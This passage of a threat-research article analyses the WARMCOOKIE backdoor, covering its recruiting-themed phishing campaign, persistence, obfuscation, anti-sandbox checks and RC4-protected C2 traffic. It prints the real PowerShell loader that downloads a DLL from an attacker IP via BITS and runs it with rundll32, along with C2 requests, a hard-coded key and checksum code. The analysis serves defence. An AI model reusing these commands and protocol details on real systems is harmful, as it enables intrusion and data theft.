0xFFFFFFFF\n            else:\n                i = (i \u003e\u003e 1) \u0026 0xFFFFFFFF\n            v6 \u003e\u003e= 1\n\n    return ~i \u0026 0xFFFFFFFF\n\n\nserial_volume = 0x0A2C9AD2F\n\nmutex = \"f92e6f3c-9cc3-4be0-966c-1be421e69140\".encode(\"utf-16le\")\nmutex_result = calculate_checksum(mutex, len(mutex), -1)\n\nusername = \"REM\\x00\".encode(\"utf-16le\")\nusername_result = calculate_checksum(username, len(username), -1)\n\ncomputer_name = \"DESKTOP-2C3IQHO\".encode(\"utf-16le\")\ncomputer_name_result = calculate_checksum(computer_name, len(computer_name), -1)\n\nprint(f\"Mutex: {hex(mutex_result)}\")\nprint(f\"Username: {hex(username_result)}\")\nprint(f\"Computer Name: {hex(computer_name_result)}\")\nprint(f\"#1 Checksum: {hex(serial_volume ^ mutex_result)}\")\nprint(f\"#2 Checksum: {hex(username_result ^ computer_name_result)}\")\n```","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var f=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),w=(n,e)=\u003e{for(var t in e)a(n,t,{get:e[t],enumerable:!0})},d=(n,e,t,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of g(e))!u.call(n,r)\u0026\u0026r!==t\u0026\u0026a(n,r,{get:()=\u003ee[r],enumerable:!(s=m(e,r))||s.enumerable});return n};var y=(n,e,t)=\u003e(t=n!=null?h(p(n)):{},d(e||!n||!n.__esModule?a(t,\"default\",{value:n,enumerable:!0}):t,n)),b=n=\u003ed(a({},\"__esModule\",{value:!0}),n);var o=f((R,l)=\u003e{l.exports=_jsx_runtime});var T={};w(T,{default:()=\u003ek,frontmatter:()=\u003ev});var i=y(o()),v={title:\"Dipping into Danger: The WARMCOOKIE backdoor\",slug:\"dipping-into-danger\",date:\"2024-06-12\",subtitle:\"Novel malware discovery by Elastic Security Labs masquerades as a recruiting offer\",description:\"Elastic Security Labs observed threat actors masquerading as recruiting firms to deploy a new malware backdoor called WARMCOOKIE. This malware has standard backdoor capabilities, including capturing screenshots, executing additional malware, and reading/writing files.\",author:[{slug:\"daniel-stepanic\"}],image:\"warmcookie.jpg\",category:[{slug:\"malware-analysis\"}],tags:[\"warmcookie\",\"backdoor\",\"ref6127\"]};function c(n){let e=Object.assign({h2:\"h2\",p:\"p\",a:\"a\",code:\"code\",ul:\"ul\",li:\"li\",img:\"img\",pre:\"pre\",h3:\"h3\",h4:\"h4\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",strong:\"strong\"},n.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:\"warmcookie-at-a-glance\",children:\"WARMCOOKIE at a glance\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic Security Labs observed a wave of email campaigns in late April targeting environments by deploying a new backdoor we\\u2019re calling WARMCOOKIE based on data sent through the HTTP cookie parameter. During initial triage, our team identified code overlap with a previously publicly reported \",(0,i.jsx)(e.a,{href:\"https://esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign\",rel:\"nofollow\",children:\"sample\"}),\" by eSentire. The unnamed sample (\",(0,i.jsx)(e.code,{children:\"resident2.exe\"}),\") discussed in the post appears to be an older or deviated version of WARMCOOKIE. While some features are similar, such as the implementation of string obfuscation, WARMCOOKIE contains differing functionality. Our team is seeing this threat distributed daily with the use of recruiting and job themes targeting individuals.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"WARMCOOKIE appears to be an initial backdoor tool used to scout out victim networks and deploy additional payloads. Each sample is compiled with a hard-coded C2 IP address and RC4 key.\"}),`\n`,(0,i.jsx)(e.p,{children:\"This post will review an observed campaign and this new malware\\u2019s functionality. While the malware has a limited number of capabilities, it shouldn\\u2019t be taken lightly as it\\u2019s actively being used and impacting organizations at a global scale.\"}),`\n`,(0,i.jsx)(e.h2,{id:\"key-takeaways\",children:\"Key takeaways\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"REF6127 represents recruiting-themed phishing campaigns to deploy a new Windows backdoor: WARMCOOKIE\"}),`\n`,(0,i.jsx)(e.li,{children:\"WARMCOOKIE is a newly discovered backdoor used to fingerprint a machine, capture screenshots of the victim machine, and deploy additional payloads\"}),`\n`,(0,i.jsx)(e.li,{children:\"Threat actors are spinning up new domains and infrastructure weekly to support these campaigns\"}),`\n`,(0,i.jsx)(e.li,{children:\"This research includes an IDAPython script to decrypt strings from WARMCOOKIE\"}),`\n`,(0,i.jsx)(e.li,{children:\"Elastic Security provides prevention and visibility capabilities across the entire WARMCOOKIE infection chain\"}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"ref6127-campaign-overview\",children:\"REF6127 campaign overview\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image10.png\",alt:\"WARMCOOKIE execution flow\",title:\"WARMCOOKIE execution flow\",width:\"1440\",height:\"1021\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Since late April 2024, our team has observed new phishing campaigns leveraging lures tied to recruiting firms. These emails targeted individuals by their names and their current employer, enticing victims to pursue new job opportunities by clicking a link to an internal system to view a job description. Below is an example of the phishing email collected from previous open source reporting.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image14.png\",alt:\"Phishing email - Subject: \\u201CWe\\u2019re Interested\\u201D\",title:\"Phishing Email - Subject: \\u201CWe\\u2019re Interested\\u201D\",width:\"1440\",height:\"679\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Once clicked, the users hit a landing page that looks like a legitimate page specifically targeted for them. There, they are prompted to download a document by solving a CAPTCHA challenge. The landing pages resemble previous campaigns documented by Google Cloud\\u2019s security team when discussing a new variant of \",(0,i.jsx)(e.a,{href:\"https://cloud.google.com/blog/topics/threat-intelligence/rm3-ldr4-ursnif-banking-fraud/\",rel:\"nofollow\",children:\"URSNIF\"}),\". Below is an example of the landing page collected from previous open source reporting.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image6.png\",alt:\"Landing page\",title:\"Landing page\",width:\"1440\",height:\"982\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Once the CAPTCHA is solved, an obfuscated JavaScript file is downloaded from the page. Our sample was named \",(0,i.jsx)(e.code,{children:\"Update_23_04_2024_5689382.js\"}),\"; however, other samples used a different but similar naming structure.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"This obfuscated script runs PowerShell, kicking off the first task to load WARMCOOKIE.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image17.png\",alt:\"Initial execution chain as seen in Elastic Security for Endpoint\",title:\"Initial execution chain as seen in Elastic Security for Endpoint\",width:\"922\",height:\"479\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The PowerShell script abuses the Background Intelligent Transfer Service (BITS) to download WARMCOOKIE and run the DLL with the \",(0,i.jsx)(e.code,{children:\"Start\"}),\" export.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-powershell\",children:`start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\\\' + \n    [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source \n    'http://80.66.88[.]146/data/5fb6dd81093a0d6812c17b12f139ce35' \n    -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + \n    ',Start'; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job\n`})}),`\n`,(0,i.jsx)(e.h3,{id:\"ref6127-infrastructure-overview\",children:\"REF6127 infrastructure overview\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"By leveraging tools like \",(0,i.jsx)(e.a,{href:\"https://urlscan.io/ip/45.9.74.135\",rel:\"nofollow\",children:\"urlscan.io\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://www.virustotal.com/gui/ip-address/45.9.74.135/relations\",rel:\"nofollow\",children:\"VirusTotal\"}),\", we observed the threat actor continually generating new landing pages rapidly on IP address \",(0,i.jsx)(e.code,{children:\"45.9.74[.]135\"}),\". The actor pushed to target different recruiting firms in combination with keywords related to the job search industry.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image3.png\",alt:\"Domains associated with 45.9.74[.]135\",title:\"Domains associated with 45.9.74[.]135\",width:\"1123\",height:\"264\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Before hitting each landing page, the adversary distances itself by using compromised infrastructure to host the initial phishing URL, which redirects the different landing pages.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image21.png\",alt:\"Phishing link redirection\",title:\"Phishing link redirection\",width:\"549\",height:\"206\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The threat actor generates new domains while the reputation catches up with each domain after each campaign run. At the time of writing, the threat actor can be seen pivoting to fresh domains without many reputation hits.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image18.png\",alt:\"Reputation for recently generated domains\",title:\"Reputation for recently generated domains\",width:\"1440\",height:\"785\"})}),`\n`,(0,i.jsx)(e.h2,{id:\"warmcookie-malware-anlaysis\",children:\"WARMCOOKIE malware anlaysis\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"WARMCOOKIE is a Windows DLL used by the threat actor in two different stages. The first stage occurs right after the PowerShell download with the execution of WARMCOOKIE using the \",(0,i.jsx)(e.code,{children:\"Start\"}),\" export.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"stage-1\",children:\"Stage 1\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Stage 1 copies the downloaded DLL from a temporary directory with a random name, such as: \",(0,i.jsx)(e.code,{children:\"wid4ta3v.3gm,\"}),\" and places a copy of the DLL at \",(0,i.jsx)(e.code,{children:\"C:\\\\ProgramData\\\\RtlUpd\\\\RtlUpd.dll\"})]}),`\n`,(0,i.jsx)(e.p,{children:\"After the copy, the malware sets up persistence using COM with the Windows Task Scheduler to configure the DLL to run with the following parameters.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-cmd\",children:`\"C:\\\\WINDOWS\\\\system32\\\\rundll32.exe\" \"C:\\\\ProgramData\\\\RtlUpd\\\\RtlUpd.dll\",Start /p\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"With this design choice, WARMCOOKIE will run with System privileges from the Task Scheduler Engine. Below is a screenshot from \",(0,i.jsx)(e.a,{href:\"https://tria.ge/240528-2dhvdagb62/behavioral1\",rel:\"nofollow\",children:\"Hatching Triage\"}),\" showing these two stages:\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image13.png\",alt:\"WARMCOOKIE - Execution chain\",title:\"WARMCOOKIE - Execution chain\",width:\"1271\",height:\"627\"})}),`\n`,(0,i.jsx)(e.h4,{id:\"persistence\",children:\"Persistence\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"A critical part of the infection chain comes from the scheduled task, which is set up at the very beginning of the infection. The task name (\",(0,i.jsx)(e.code,{children:\"RtlUpd\"}),\") is scheduled to run every 10 minutes every day.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image34.png\",alt:\"Persistence - Scheduled Task\",title:\"Persistence - Scheduled Task\",width:\"798\",height:\"608\"})}),`\n`,(0,i.jsx)(e.h3,{id:\"stage-2\",children:\"Stage 2\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The second stage is where the DLL is combined with the command line (\",(0,i.jsx)(e.code,{children:\"Start /p\"}),\") and contains the core functionality of WARMCOOKIE. The malware starts by looking for the DLL inside the temporary directory from the PowerShell download.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image23.png\",alt:\"Initial code within WARMCOOKIE\",title:\"Initial code within WARMCOOKIE\",width:\"876\",height:\"386\"})}),`\n`,(0,i.jsx)(e.h4,{id:\"obfuscation\",children:\"Obfuscation\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"WARMCOOKIE protects its strings using a custom string decryption algorithm. The first four bytes of each encrypted string in the \",(0,i.jsx)(e.code,{children:\".rdata\"}),\" section represent the size, the next four-bytes represent the RC4 key, and the remaining bytes represent the string.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image22.png\",alt:\"String Obfuscation - Legend\",title:\"String Obfuscation - Legend\",width:\"698\",height:\"226\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Below is the CyberChef recipe using the bytes from the screenshot above:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image9.png\",alt:\"String Decryption via CyberChef\",title:\"String Decryption via CyberChef\",width:\"627\",height:\"292\"})}),`\n`,(0,i.jsx)(e.p,{children:\"One interesting observation is that the malware developer doesn\\u2019t always rotate the RC4 key between the encrypted strings.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image1.png\",alt:\"Same RC4 key for different encrypted string\",title:\"Same RC4 key for different encrypted string\",width:\"959\",height:\"366\"})}),`\n`,(0,i.jsx)(e.h4,{id:\"dynamic-api-loading\",children:\"Dynamic API loading\"}),`\n`,(0,i.jsx)(e.p,{children:\"To prevent static analysis from identifying its core functionality, WARMCOOKIE uses dynamic API loading. There is no API hashing/resolving, and the targeted DLLs and sensitive strings are protected using encryption.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image32.png\",alt:\"Dynamic API loading within WARMCOOKIE\",title:\"Dynamic API loading within WARMCOOKIE\",width:\"776\",height:\"408\"})}),`\n`,(0,i.jsx)(e.p,{children:\"As demonstrated in the previous image, the developer shows some consideration for OpSec: any decrypted string is wiped from memory immediately after use, potentially avoiding memory signature scans.\"}),`\n`,(0,i.jsx)(e.h4,{id:\"anti-debugging\",children:\"Anti-debugging\"}),`\n`,(0,i.jsx)(e.p,{children:\"The malware contains a few anti-analysis checks commonly used to target sandboxes. These are based on logic for checking the active number of CPU processors and physical/virtual memory values.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image40.png\",alt:\"Sandbox verification\",title:\"Sandbox verification\",width:\"865\",height:\"151\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Below are the following conditions:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"If the number of processors is greater than or equal to 4 and the calculated value from the \",(0,i.jsx)(e.code,{children:\"GlobalMemoryStatusEx\"}),\" call is greater than or equal to 0xF00, the malware will continue execution\"]}),`\n`,(0,i.jsx)(e.li,{children:\"If the number of processors is greater than or equal to 8, the malware will continue execution\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"If the calculated value from the \",(0,i.jsx)(e.code,{children:\"GlobalMemoryStatusEx\"}),\" call is greater than \",(0,i.jsx)(e.code,{children:\"0x2000\"}),\", the malware will continue execution\"]}),`\n`]}),`\n`,(0,i.jsx)(e.h4,{id:\"mutex\",children:\"Mutex\"}),`\n`,(0,i.jsx)(e.p,{children:\"Each WARMCOOKIE sample comes hard coded with a GUID-like string as a mutex. Below are some examples we have observed:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"f92e6f3c-9cc3-4be0-966c-1be421e69140\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"91f785f4-2fa4-4c85-954d-b96768ca76f2\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image35.png\",alt:\"Setup before main functionality, including mutex creation\",title:\"Setup before main functionality, including mutex creation\",width:\"801\",height:\"522\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Before the main functionality is executed, WARMCOOKIE uses an OR statement to verify the command-line arguments with \",(0,i.jsx)(e.code,{children:\"/p\"}),\" returns \",(0,i.jsx)(e.code,{children:\"True\"}),\" or to check whether the scheduled task persistence needs to be created.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"execution\",children:\"Execution\"}),`\n`,(0,i.jsx)(e.p,{children:\"Before the backdoor makes its first outbound network request, it captures the following values used to fingerprint and identify the victim machine.\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Volume serial number\"}),`\n`,(0,i.jsx)(e.li,{children:\"DNS domain of the victim machine\"}),`\n`,(0,i.jsx)(e.li,{children:\"Computer name\"}),`\n`,(0,i.jsx)(e.li,{children:\"Username\"}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This was a criteria used to identify the similarities to the malware in eSentire\\u2019s \",(0,i.jsx)(e.a,{href:\"https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-resident-campaign\",rel:\"nofollow\",children:\"report\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image8.png\",alt:\"Checksum calculations similar to eSentire's report\",title:\"Checksum calculations similar to eSentire's report\",width:\"1096\",height:\"558\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The WARMCOOKIE C2 server likely leverages a CRC32 checksum function to verify content sent from the victim machine. Inside WARMCOOKIE itself is a checksum function that takes an input string, a length, and an initial seed value for the CRC32 function. At the beginning of the function, the seed value is negated, so at different times, the checksum function is called with different seeds. We believe the developer added this step to make it a little harder for researchers to analyze and waste time.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image31.png\",alt:\"Beginning of CRC32 checksum function\",title:\"Beginning of CRC32 checksum function\",width:\"922\",height:\"134\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The following three checksum calculations are encrypted with RC4 and sent through the HTTP cookie parameter:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"CRC32(c2_message_data)\"}),`\n`,(0,i.jsx)(e.li,{children:\"CRC32(mutex) ^ volume serial number\"}),`\n`,(0,i.jsx)(e.li,{children:\"CRC32(username) ^ CRC32(computer name)\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Below is the implementation in Python with a usage example in the Appendix:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-python\",children:`def calculate_checksum(str_input, str_len, i):\n    if i == 0:\n        i = 0xFFFFFFFF\n    if i == -1:\n        i = 0\n\n    for idx in range(0, str_len, 2):\n        v6 = str_input[idx] | (str_input[idx + 1] \u003c\u003c 8)\n        for _ in range(16):\n            if (v6 ^ i) \u0026 1:\n                i = ((i \u003e\u003e 1) ^ 0xEDB88320) \u0026 0xFFFFFFFF\n            else:\n                i = (i \u003e\u003e 1) \u0026 0xFFFFFFFF\n            v6 \u003e\u003e= 1\n\n    return ~i \u0026 0xFFFFFFFF\n`})}),`\n`,(0,i.jsx)(e.h4,{id:\"communication\",children:\"Communication\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"WARMCOOKIE samples communicate over HTTP with a hardcoded IP address. The family uses a combination of RC4 and Base64 to protect its network traffic. The RC4 key is embedded in each sample. We have observed the same key being used in multiple samples. The key during this analysis is \",(0,i.jsx)(e.code,{children:\"24de21a8dc08434c\"})]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image11.png\",alt:\"Hardcoded RC4 key being decrypted\",title:\"Hardcoded RC4 key being decrypted\",width:\"649\",height:\"95\"})}),`\n`,(0,i.jsx)(e.p,{children:\"The malware uses a custom structure to send the initial request to the C2 server, including the previously described checksum values and several fields used to track the offsets and size of the variable data.\"}),`\n`,(0,i.jsx)(e.p,{children:\"These values are sent through the HTTP cookie parameter using the following custom structure:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-cpp\",children:`enum request_type\n{ \n    REGISTRATION = 1, \n    COMMAND = 2 \n};\n\nstruct os_info\n{\n    int major_version;\n    int minor_version;\n    int build_number;\n    int version_calc;\n};\n\nstruct initial_request\n{\n    int checksum_c2_message_data;\n    int checksum_volume_mutex;\n    int checksum_computer_name_username;\n    request_type request_type;\n    os_info os_ver;\n    int offset_to_dns_domain;\n    int size_base64_dns_domain;\n    int offset_to_base64_computer_name;\n    int size_base64_computer_name;\n    int offset_to_base64_username;\n    int size_base64_username;\n    char base64_dns_domain[]; // Variable-length array\n    char base64_username[]; // Variable-length array\n    char base64_computer_name[]; // Variable-length array \n};\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The first request to the C2 server is sent through a GET request using User Agent: \",(0,i.jsx)(e.code,{children:\"Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705\"}),\".\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-curl\",children:`GET http://185.49.69[.]41/ HTTP/1.1\nCookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=\nUser-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)\nHost: 185.49.69[.]41\nConnection: Keep-Alive\nPragma: no-cache\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Below is the CyberChef recipe of the HTTP cookie parameter decrypted from the first request, followed by a legend of the fields:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image24.png\",alt:\"Decryption of HTTP cookie via CyberChef\",title:\"Decryption of HTTP cookie via CyberChef\",width:\"1440\",height:\"620\"})}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image20.png\",alt:\"Decryption of HTTP cookie parameters via ImHex\",title:\"Decryption of HTTP cookie parameters via ImHex\",width:\"1099\",height:\"487\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"WARMCOOKIE inserts a few integrity checks by generating hashes using the previously described checksum function. For example, the data in the decrypted HTTP cookie parameter from the 4th byte to the end is hashed and placed at the beginning (offset 0). Using the example above, this checksum value is \",(0,i.jsx)(e.code,{children:\"0xe51387e9\"})]}),`\n`,(0,i.jsx)(e.p,{children:\"Before the malware can receive instructions, integrity checks are also used to verify the incoming response from the C2 server. In this scenario, the C2 server produces the expected checksum for the data sent to the victim machine. This is located in the first four bytes of the request.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image7.png\",alt:\"Checksum verification from incoming server request\",title:\"Checksum verification from incoming server request\",width:\"1108\",height:\"93\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Below is a demonstration of this integrity check where the request data\\u2019s hash is \",(0,i.jsx)(e.code,{children:\"0x50d26cc3\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image39.png\",alt:\"Integrity check via CyberChef\",title:\"Integrity check via CyberChef\",width:\"1440\",height:\"443\"})}),`\n`,(0,i.jsx)(e.p,{children:\"If the checksum matches, WARMCOOKIE reads the command ID at the 8th-byte offset of the request to proceed to move to the next command handler.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"bot-functionality\",children:\"Bot functionality\"}),`\n`,(0,i.jsx)(e.p,{children:\"WARMCOOKIE provides 7 command handlers for threat actors to retrieve additional victim information, record screenshots, launch additional payloads, etc. The provided functionality is relatively straightforward, allowing threat groups that need a lightweight backdoor to monitor victims and deploy further damaging payloads such as ransomware.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Command ID\"}),(0,i.jsx)(e.th,{children:\"Description\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"1\"}),(0,i.jsx)(e.td,{children:\"Retrieve victim details\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"2\"}),(0,i.jsx)(e.td,{children:\"Record screenshots of victim machine\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"3\"}),(0,i.jsx)(e.td,{children:\"Retrieve installed programs via Uninstall registry path\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"4\"}),(0,i.jsx)(e.td,{children:\"Command-line execution (cmd.exe /c)\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"5\"}),(0,i.jsx)(e.td,{children:\"Write file to victim machine\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"6\"}),(0,i.jsx)(e.td,{children:\"Read file from victim machine\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"10\"}),(0,i.jsx)(e.td,{children:\"Delete scheduled task persistence\"})]})]})]})}),`\n`,(0,i.jsx)(e.h4,{id:\"retrieve-victim-details---command-id-1\",children:\"Retrieve victim details - command ID (1)\"}),`\n`,(0,i.jsx)(e.p,{children:\"This handler fingerprints and identifies the victim machines by collecting the IP address and CPU information. Interestingly, the imports required for this handler are statically imported.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image16.png\",alt:\"Retrieving CPU info (Handler 1)\",title:\"Retrieving CPU info (Handler 1)\",width:\"951\",height:\"523\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The malware uses HTTP \",(0,i.jsx)(e.code,{children:\"POST\"}),\" requests when sending data back to the C2 server. The HTTP POST request data is encrypted via RC4 and sent over the network in raw form. In addition, the IP address and CPU information are Base64 encoded.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:\"language-curl\",children:`POST http://185.49.69[.]41/ HTTP/1.1\nCookie: x41OYTpmEwUUKm2AvnkS2onu1XqjP6shVvosIXkAD957a9RplEGFsUjR8f/lP1O8EERtf+idl0bimsKh8mRA7+dL0Yk09SwgTUKBu9WEK4RwjhkYuxd2JGXxhlA=\nUser-Agent: Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)\nHost: 185.49.69.41\nContent-Length: 136\nConnection: Keep-Alive\nPragma: no-cache\n\n  qI:f*m  y\\u0682  z ? !  ,!w   k i A  K    k8 .(M \\u07A3\u003e \\u078B  u[\\xF4z  0 -U~    9 z\\x7F G(  *X  o_  _      * Y, q  glTs   XI8b\\\\)W   W\"\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"After decrypting the HTTP POST request data, this presents a similar structure as before, where the data is front-loaded with the checksum values, offsets, and sizes to the pertinent information targeted by the handler. In this case, the Base64 encoded data is the IP Address and CPU info.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/dipping-into-danger/image36.png\",alt:\"Decrypted POST Request Data from Handler 1\",title:\"Decrypted POST Request Data from Handler 1\",width:\"628\",height:\"177\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Encoded Value\"}),(0,i.jsx)(e.th,{children:\"Decoded Value\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"MTkyLjE2OC4xODIuMTMx\"}),(0,i.jsx)(e.td,{children:\"192.168.182.131\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"QU1EIFJ5emVuIDcgNzgwMFgzRCA4LUNvcmUgUHJvY2Vzc29yICAgICAgICAgICA=\"}),(0,i.jsx)(e.td,{children:\"AMD Ryzen 7 7800X3D 8-Core Processor\"})]})]})]})}),`\n`,(0,i.jsx)(e.h4,{id:\"screenshot-capture---command-id-2\",children:\"Screenshot capture - command ID (2)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The ability to capture screenshots from victim machines provides a wide range of malicious options, such as stealing sensitive information displayed on the screen or actively monitoring the victim\\u2019s machine. This handler dynamically loads Windows DLLs used for graphics and drawing operations, such as \",(0,i.jsx)(e.code,{children:\"GDI32.DLL\"}),\" and \",(0,i.jsx)(e.code,{children:\"GDIPLUS.DLL\"}),\", and then uses various APIs, such as \",(0,i.jsx)(e.code,{children:\"BitBlt\"}),\",\",(0,i.jsx)(e.code,{children:\"CreateCompatibleBitmap\"}),\", and \",(0,i.jsx)(e.code,{children:\"GetSystemMetrics\"}),\" to generate the 